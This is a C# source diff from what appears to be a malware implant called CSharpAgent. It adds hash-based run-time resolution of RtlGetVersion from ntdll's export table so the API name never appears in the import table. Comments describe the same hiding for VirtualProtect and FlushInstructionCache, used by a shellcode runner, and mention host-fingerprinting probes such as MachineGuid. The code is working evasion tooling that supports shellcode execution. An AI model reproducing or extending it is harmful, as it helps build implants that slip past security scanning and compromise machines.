@@ -49,18 +49,51 @@ namespace CSharpAgent
 
     internal static class NativeImports
     {
-        // NOTE (audit No.21, rung 1): VirtualProtect and FlushInstructionCache are GONE from
-        // this static surface — ShellcodeRunner resolves both at call time from the live
-        // kernel32 export table by hash, so neither name rides the import table. The four
-        // declarations below are the remaining imports (Identity's probes — later rungs).
+        // NOTE (audit No.21): the ladder strips static imports one rung at a time — rung 1
+        // took VirtualProtect + FlushInstructionCache (ShellcodeRunner resolves both from
+        // the live kernel32 export table by hash), rung 2 took RtlGetVersion (below). The
+        // three declarations remaining are Identity's probes — later rungs.
+
+        // --- Dynamic-resolution core (audit No.21) --------------------------------------
+        // Managed module lookup — the base address every hash resolve starts from. NO
+        // GetModuleHandle import: System.dll (already the single reference) enumerates the
+        // process's own modules, and a WOW64 process lists its 32-bit DLLs — the ones this
+        // code can actually call — so bitness always matches the process.
+        internal static IntPtr ModuleBase(string lowerName)
+        {
+            var modules = System.Diagnostics.Process.GetCurrentProcess().Modules;
+            for (var i = 0; i < modules.Count; i++)
+                if (string.Compare(modules[i].ModuleName, lowerName, true) == 0)
+                    return modules[i].BaseAddress;
+            return IntPtr.Zero;
+        }
+
+        // Truthful OS version (Environment.OSVersion inherits the host manifest's
+        // compatibility lies on Windows 8.1+) — resolved at call time from the live ntdll
+        // export table by hash instead of a static import (audit No.21, rung 2): the API
+        // name never rides the import table. The caller (Identity's OS probe) already
+        // degrades to Environment.OSVersion if this throws. Returns 0 on success.
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        private delegate int OsVersionFn(ref OSVERSIONINFOW versionInfo);
+        private static OsVersionFn _osVersion;
+
+        internal static int GetOsVersion(ref OSVERSIONINFOW versionInfo)
+        {
+            if (_osVersion == null)
+            {
+                var ntdll = ModuleBase("ntdll.dll");
+                if (ntdll == IntPtr.Zero)
+                    throw new InvalidOperationException("ntdll.dll is not in the process module list");
+                var proc = ShellcodeRunner.GetProcAddressByHash(ntdll, 1070062793); // djb2(77777) "rtlgetversion"
+                if (proc == IntPtr.Zero)
+                    throw new InvalidOperationException("ntdll export hash did not resolve");
+                _osVersion = (OsVersionFn)Marshal.GetDelegateForFunctionPointer(proc, typeof(OsVersionFn));
+            }
+            return _osVersion(ref versionInfo);
+        }
 
         [DllImport("kernel32.dll")]
         internal static extern void GetNativeSystemInfo(out SYSTEM_INFO lpSystemInfo);
-
-        // Truthful OS version (Environment.OSVersion inherits the host manifest's compatibility
-        // lies on Windows 8.1+). Returns 0 on success.
-        [DllImport("ntdll.dll")]
-        internal static extern int RtlGetVersion(ref OSVERSIONINFOW versionInfo);
 
         // MachineGuid through the EXPLICIT 32-bit registry view — see Identity.MachineGuid32View.
         // dwFlags = RRF_RT_REG_SZ | RRF_SUBKEY_WOW6432KEY (RegGetValue takes its OWN wow64
